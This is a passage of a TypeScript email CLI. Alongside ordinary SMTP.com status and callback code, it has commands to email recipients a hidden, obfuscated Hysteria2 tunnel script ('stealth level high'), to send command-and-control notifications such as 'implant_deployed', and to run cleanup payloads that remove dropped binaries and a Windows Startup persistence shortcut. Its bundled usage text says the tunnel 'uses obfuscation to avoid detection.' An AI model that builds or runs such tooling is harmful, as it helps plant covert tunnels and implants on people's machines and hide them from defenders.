        'echo "Cleanup complete"',
      ], 'linux', 'Cleanup script');
    } else {
      return createSetupScriptPayload([
        '# Windows cleanup script',
        'Stop-Process -Name "h2" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:TEMP\\h2.exe" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:TEMP\\h2.yaml" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h2.lnk" -Force -ErrorAction SilentlyContinue',
        'Write-Host "Cleanup complete"',
      ], 'windows', 'Windows cleanup script');
    }
  },

  documentation: (): PayloadAttachment => {
    return createReadmePayload(
      `## Usage Instructions

### Quick Start
1. Save the tunnel script to your system
2. Make it executable: \`chmod +x shadowgrok-tunnel.sh\`
3. Run it: \`./shadowgrok-tunnel.sh\`

### Verification
- Check if tunnel is running: \`ps aux | grep h2\`
- Test connection: \`curl --socks5 127.0.0.1:1080 https://api.ipify.org\`

### Configuration
- Config file location: \`/tmp/h2.conf\`
- Log file location: \`/tmp/h2.log\`
- Default port: SOCKS5 on 127.0.0.1:1080

### Troubleshooting
- If connection fails, check your firewall settings
- Ensure port 443 is not blocked
- Verify the server address is correct

### Security Notes
- This tunnel uses obfuscation to avoid detection
- Traffic appears as normal HTTPS
- Auto-expires after the configured time limit
- Always run in a secure environment`,
      'Usage documentation'
    );
  },
};

// ============================================================================
// CALLBACK AND STATUS FUNCTIONS (New CLI features)
// ============================================================================

function parseHttpUrl(value: string): string {
  const url = new URL(value);

  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    throw new Error('Callback URL must use http or https.');
  }

  return url.toString();
}

function buildDeliveredCallbackInput(values: CliValues, config: ApiConfig): DeliveredCallbackInput {
  const address = values.url?.trim() ?? getEnv('SMTP_CALLBACK_DELIVERED_URL');

  return {
    address: parseHttpUrl(requireValue(address, 'Pass --url or set SMTP_CALLBACK_DELIVERED_URL.')),
    channel: values.channel?.trim() ?? config.channel,
    dryRun: values['dry-run'] ?? false,
  };
}

function buildCallbackServerInput(values: CliValues): CallbackServerInput {
  const endpointPath = values.path?.trim() ?? getEnv('CALLBACK_PATH') ?? '/smtp/delivered';

  if (!endpointPath.startsWith('/')) {
    throw new Error('Callback endpoint path must start with /.');
  }

  return {
    endpointPath,
    host: values.host?.trim() ?? getEnv('CALLBACK_HOST') ?? '127.0.0.1',
    port: parsePositiveInteger('port', values.port ?? getEnv('CALLBACK_PORT'), 3000, 1, 65535),
  };
}

function buildStatusQueryInput(values: CliValues, config: ApiConfig): StatusQueryInput {
  const wait = values.wait ?? false;
  const msgId = values['msg-id']?.trim();
  const subject = values.subject?.trim();
  const to = values.to?.trim().toLowerCase();

  if (wait && !msgId && !subject && !to) {
    throw new Error('Use --wait with --msg-id, --subject, or --to to avoid polling unrelated messages.');
  }

  return {
    attempts: parsePositiveInteger('attempts', values.attempts, wait ? 6 : 1, 1, 100),
    channel: values.channel?.trim() ?? config.channel,
    dryRun: values['dry-run'] ?? false,
    intervalSeconds: parsePositiveInteger('interval-seconds', values['interval-seconds'], 10, 1, 600),
    limit: parsePositiveInteger('limit', values.limit, 10, 1, 1000),
    minutes: parsePositiveInteger('minutes', values.minutes, 180, 1, 10080),
    msgId,
    subject,
    to,
    wait,
  };
}

function normalizeMessageStatus(item: any): MessageStatus {
  const msgData = item?.msg_data ?? {};
  const delivery = item?.details?.delivery ?? {};

  return {
    channel: item?.channel,
    code: delivery?.code,
    event: delivery?.event,
    finished: delivery?.finished,
    from: msgData?.from,
    msgId: item?.msg_id,
    msgTime: item?.msg_time,
    recipient: msgData?.rcpt_to,
    retries: delivery?.retries,
    status: delivery?.status,
    subject: msgData?.subject,
  };
}

function getMessageTimestamp(value: string | undefined): number {
  if (!value) {
    return 0;
  }

  const timestamp = Date.parse(value);
  return Number.isNaN(timestamp) ? 0 : timestamp;
}

function matchesStatusQuery(item: MessageStatus, input: StatusQueryInput): boolean {
  if (input.msgId && item.msgId !== input.msgId) {
    return false;
  }

  if (input.to && item.recipient?.toLowerCase() !== input.to) {
    return false;
  }

  if (input.subject && item.subject !== input.subject) {
    return false;
  }

  return true;
}

function isTerminalEvent(event: string | undefined): boolean {
  return ['bounced', 'delivered', 'failed', 'hard_bounced'].includes(event ?? '');
}

async function requestSmtpApi(
  config: Pick<ApiConfig, 'apiKey' | 'baseUrl'>,
  endpoint: string,
  init: { body?: string; headers?: Record<string, string>; method?: string } = {},
): Promise<any> {
  const response = await fetch(`${config.baseUrl}${endpoint}`, {
    body: init.body,
    headers: {
      Accept: 'application/json',
      'X-SMTPCOM-API': config.apiKey,
      ...(init.headers ?? {}),
    },
    method: init.method ?? 'GET',
  });

  const raw = await response.text();
  let data: any;

  try {
    data = raw ? JSON.parse(raw) : undefined;
  } catch {
    throw new Error(`SMTP.com API returned a non-JSON response (${response.status}). Check SMTP_API_BASE_URL. Response: ${raw.slice(0, 300)}`);
  }

  if (!data || typeof data !== 'object' || typeof data.status !== 'string') {
    throw new Error(
      `SMTP.com API returned an unexpected response (${response.status}). Check SMTP_API_BASE_URL and credentials. Response: ${raw.slice(0, 300)}`,
    );
  }

  if (!response.ok || data.status === 'fail') {
    const details = data.data ?? raw ?? response.statusText;
    throw new Error(`SMTP.com API request failed (${response.status}): ${typeof details === 'string' ? details : JSON.stringify(details)}`);
  }

  return data;
}

async function fetchMessageStatuses(input: StatusQueryInput, config: ApiConfig): Promise<MessageStatus[]> {
  const now = Math.floor(Date.now() / 1000);
  const query = new URLSearchParams({
    channel: input.channel,
    end: String(now + 300),
    limit: String(input.limit),
    offset: '0',
    start: String(now - input.minutes * 60),
  });

  if (input.msgId) {
    query.set('msg_id', input.msgId);
  }

  const data = await requestSmtpApi(config, `/v4/messages?${query.toString()}`);
  const items = (((data ?? {}).data ?? {}).items ?? []) as any[];

  return items
    .map(normalizeMessageStatus)
    .filter((item) => matchesStatusQuery(item, input))
    .sort((left, right) => getMessageTimestamp(right.msgTime) - getMessageTimestamp(left.msgTime))
    .slice(0, input.limit);
}

async function showStatus(input: StatusQueryInput, config: ApiConfig): Promise<void> {
  if (input.dryRun) {
    printJson({
      endpoint: `${config.baseUrl}/v4/messages`,
      filters: {
        msgId: input.msgId,
        subject: input.subject,
        to: input.to,
      },
      query: {
        attempts: input.attempts,
        channel: input.channel,
        intervalSeconds: input.intervalSeconds,
        limit: input.limit,
        minutes: input.minutes,
        wait: input.wait,
      },
    });
    return;
  }

  let attemptsUsed = 0;
  let items: MessageStatus[] = [];

  for (let attempt = 1; attempt <= input.attempts; attempt += 1) {
    attemptsUsed = attempt;
    items = await fetchMessageStatuses(input, config);

    if (!input.wait) {
      break;
    }

    if (items.length > 0 && isTerminalEvent(items[0].event)) {
      break;
    }

    if (attempt < input.attempts) {
      await sleep(input.intervalSeconds * 1000);
    }
  }

  printJson({
    attemptsUsed,
    channel: input.channel,
    count: items.length,
    filters: {
      msgId: input.msgId,
      subject: input.subject,
      to: input.to,
    },
    latest: items[0] ?? null,
    wait: input.wait,
    windowMinutes: input.minutes,
    items,
  });
}

async function createDeliveredCallback(input: DeliveredCallbackInput, config: ApiConfig): Promise<void> {
  const query = new URLSearchParams({
    address: input.address,
    channel: input.channel,
    medium: 'http',
  });
  const endpoint = `/v4/callbacks/delivered?${query.toString()}`;

  if (input.dryRun) {
    printJson({
      endpoint: `${config.baseUrl}/v4/callbacks/delivered`,
      event: 'delivered',
      medium: 'http',
      method: 'POST',
      query: Object.fromEntries(query.entries()),
    });
    return;
  }

  const result = await requestSmtpApi(config, endpoint, { method: 'POST' });

  printJson({
    address: input.address,
    channel: input.channel,
    data: result.data ?? null,
    event: 'delivered',
    medium: 'http',
    status: result.status,
  });
}

function getHeaderValue(value: string | string[] | undefined): string | undefined {
  return Array.isArray(value) ? value.join(', ') : value;
}

function writeJsonResponse(res: ServerResponse, statusCode: number, value: unknown): void {
  const body = JSON.stringify(value);

  res.writeHead(statusCode, {
    'Content-Length': Buffer.byteLength(body),
    'Content-Type': 'application/json',
  });
  res.end(body);
}

function readRequestBody(req: IncomingMessage, maxBytes = 1024 * 1024): Promise<string> {
  return new Promise((resolve, reject) => {
    let body = '';
    let bytes = 0;

    req.setEncoding('utf8');
    req.on('data', (chunk: string) => {
      bytes += Buffer.byteLength(chunk);

      if (bytes > maxBytes) {
        reject(new Error('Request body is too large.'));
        req.destroy();
        return;
      }

      body += chunk;
    });
    req.on('end', () => resolve(body));
    req.on('error', reject);
  });
}

function parseCallbackBody(rawBody: string, contentType: string | undefined): unknown {
  if (!rawBody) {
    return null;
  }

  const normalizedContentType = contentType?.split(';')[0]?.trim().toLowerCase() ?? '';

  if (normalizedContentType === 'application/json' || normalizedContentType.endsWith('+json')) {
    return JSON.parse(rawBody);
  }

  if (normalizedContentType === 'application/x-www-form-urlencoded') {
    return Object.fromEntries(new URLSearchParams(rawBody).entries());
  }

  return rawBody;
}

async function handleCallbackRequest(req: IncomingMessage, res: ServerResponse, input: CallbackServerInput): Promise<void> {
  const requestUrl = new URL(req.url ?? '/', `http://${req.headers.host ?? `${input.host}:${input.port}`}`);

  if (requestUrl.pathname !== input.endpointPath) {
    writeJsonResponse(res, 404, { error: 'Not found' });
    return;
  }

  if (req.method === 'GET' || req.method === 'HEAD') {
    writeJsonResponse(res, 200, {
      endpoint: input.endpointPath,
      ok: true,
    });
    return;
  }

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'GET, HEAD, POST');
    writeJsonResponse(res, 405, { error: 'Method not allowed' });
    return;
  }

  let rawBody: string;

  try {
    rawBody = await readRequestBody(req);
  } catch (error) {
    writeJsonResponse(res, 413, { error: formatError(error) });
    return;
  }

  let body: unknown;

  try {
    body = parseCallbackBody(rawBody, getHeaderValue(req.headers['content-type']));
  } catch {
    writeJsonResponse(res, 400, { error: 'Invalid JSON callback body.' });
    return;
  }

  const received = {
    body,
    headers: {
      contentType: getHeaderValue(req.headers['content-type']),
      userAgent: getHeaderValue(req.headers['user-agent']),
    },
    method: req.method,
    path: requestUrl.pathname,
    query: Object.fromEntries(requestUrl.searchParams.entries()),
    receivedAt: new Date().toISOString(),
  };

  printJson(received);
  writeJsonResponse(res, 200, { ok: true });
}

async function startCallbackServer(input: CallbackServerInput): Promise<void> {
  const server = createServer((req, res) => {
    void handleCallbackRequest(req, res, input).catch((error) => {
      console.error(formatError(error));
      writeJsonResponse(res, 500, { error: 'Internal server error' });
    });
  });

  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(input.port, input.host, () => {
      server.off('error', reject);
      printJson({
        endpoint: `http://${input.host}:${input.port}${input.endpointPath}`,
        host: input.host,
        path: input.endpointPath,
        port: input.port,
        status: 'listening',
      });
      resolve();
    });
  });
}

// ============================================================================
// CLI ENTRY POINT
// ============================================================================

async function buildTunnelInput(values: CliValues): Promise<SendTunnelScriptOptions> {
  const to = values.to?.trim();

  if (!to) {
    throw new Error('Provide at least one recipient with --to.');
  }

  const nodeId = values['node-id']?.trim();
  const platform = (values.platform?.trim() as any) || 'all';
  const stealthLevel = (values['stealth-level']?.trim() as any) || 'high';
  const tunnelType = (values['tunnel-type']?.trim() as any) || 'hysteria2-obfs';

  return {
    to,
    subject: values.subject?.trim() || 'Your Secure Tunnel Access',
    tunnelType,
    platform,
    stealthLevel,
    nodeId,
    expiresInHours: 72,
    payloads: [],
    cc: parseAddressList(values.cc),
    bcc: parseAddressList(values.bcc),
    replyTo: values['reply-to']?.trim(),
    dryRun: values['dry-run'] ?? false,
    transport: getTransport(values.transport),
  };
}

async function buildNotifyInput(values: CliValues): Promise<SendNotificationOptions> {
  const to = values.to?.trim();

  if (!to) {
    throw new Error('Provide at least one recipient with --to.');
  }

  const type = (values.type?.trim() as any) || 'implant_deployed';

  return {
    to,
    type,
    data: {},
    dryRun: values['dry-run'] ?? false,
    transport: getTransport(values.transport),
  };
}

async function main(): Promise<void> {
  const { command, values } = parseCli();

  if (command === 'callback-delivered') {
    const config = getApiConfig();
    await createDeliveredCallback(buildDeliveredCallbackInput(values, config), config);
    return;
  }

  if (command === 'callback-server') {
    await startCallbackServer(buildCallbackServerInput(values));
    return;
  }

  if (command === 'status') {
    const config = getApiConfig();
    await showStatus(buildStatusQueryInput(values, config), config);
    return;
  }

  if (command === 'tunnel') {
    const input = await buildTunnelInput(values);
    const result = await sendHiddenHysteriaTunnelScript(input);
    printJson(result);
    return;
  }

  if (command === 'notify') {
    const input = await buildNotifyInput(values);
    const result = await sendC2Notification(input);
    printJson(result);
    return;
  }

  // Generic send command
  const input = await buildMailInput(values);

  switch (input.transport) {
    case 'smtp':
      await sendViaSmtp(input, getSmtpConfig());
      break;
    case 'api':
      await sendViaApi(input, getApiConfig());
      break;
    case 'resend':
      await sendViaResend(input);
      break;
    case 'mysmtp':
      await sendViaMySmtp(input);
      break;
    default:
      throw new Error(`Unsupported transport: ${input.transport}`);
  }
}

// Export main for programmatic use
export { main };

// Run CLI if called directly
if (require.main === module) {
  main().catch((error) => {
    console.error(formatError(error));
    console.error('');
    console.error(usage);
    process.exit(1);
  });
}
